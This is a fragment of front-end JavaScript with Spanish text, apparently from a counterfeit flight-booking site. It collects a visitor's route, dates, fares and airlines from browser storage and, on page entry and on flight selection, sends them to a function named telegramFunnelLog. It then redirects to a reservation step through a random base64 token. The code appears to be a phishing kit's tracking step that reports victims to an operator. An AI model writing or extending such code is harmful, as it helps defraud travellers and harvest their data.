...
document.addEventListener("DOMContentLoaded", function () {
    ...
    function buildFlightLogDetails() {
        var details = [];
        try {
            var raw = localStorage.getItem('pt.tb.history_booker_prod');
            if (raw) {
                var j = JSON.parse(raw);
                var from = (j.from && j.from[0] && j.from[0].displayText) ? j.from[0].displayText : '';
                var to = (j.to && j.to[0] && j.to[0].displayText) ? j.to[0].displayText : '';
                if (from && to) {
                    details.push('Viaja desde ' + from + ' a ' + to + '.');
                }
            }
            var sd = localStorage.getItem('startDateText');
            var ed = localStorage.getItem('endDateText');
            var d1 = formatLogDate(sd);
            var d2 = formatLogDate(ed);
            if (localStorage.getItem('tripMode') === '1') {
                if (d1) {
                    details.push('Fecha ida: ' + d1 + '.');
                }
            } else {
                if (d1 && d2) {
                    details.push('Fechas: ' + d1 + ' - ' + d2 + '.');
                } else if (d1) {
                    details.push('Fecha ida: ' + d1 + '.');
                }
            }

            var ida = localStorage.getItem('datos_vuelo_ida');
            var reg = localStorage.getItem('datos_vuelo_regreso');
            if (ida) {
                var ji = JSON.parse(ida);
                if (ji.type) {
                    details.push('Tarifa ida: ' + ji.type + '.');
                }
                if (ji.vuelo) {
                    details.push('Aerolinea Ida: ' + String(ji.vuelo).toLowerCase() + '.');
                }
            }
            if (reg && localStorage.getItem('tripMode') !== '1') {
                var jr = JSON.parse(reg);
                if (jr.type) {
                    details.push('Tarifa vuelta: ' + jr.type + '.');
                }
                if (jr.vuelo) {
                    details.push('Aerolinea Vuelta: ' + String(jr.vuelo).toLowerCase() + '.');
                }
            }
        } catch (e) {}
        return details;
    ...
    function logFlightsChosen(headline) {
        if (typeof telegramFunnelLog === 'function') {
            telegramFunnelLog(headline, buildFlightLogDetails());
        }
    }
        ...
        if (button) {
            button.addEventListener('click', function () {
                ...
                if (Object.keys(selectedFlight).length > 0 || localStorage.getItem('tripMode') === '1') {
                    ...
                    if (vueloType === 'ida') {
                        if (localStorage.getItem('tripMode') === '1') {
                            logFlightsChosen('ELIGIO VUELO (SOLO IDA):');
                        ...
                        logFlightsChosen('ELIGIO VUELOS IDA Y VUELTA:');
                        document.querySelector("#espera").style.visibility = "visible";
                        setTimeout(() => {
                            window.location.href = `reserve?d=${encodeBase64Unicode(generateRandomToken(150))}`;
                        }, 3000);
    ...
    if (typeof telegramFunnelLog === 'function') {
        telegramFunnelLog('INGRESO A LA PANTALLA DE VUELOS', []);
    }
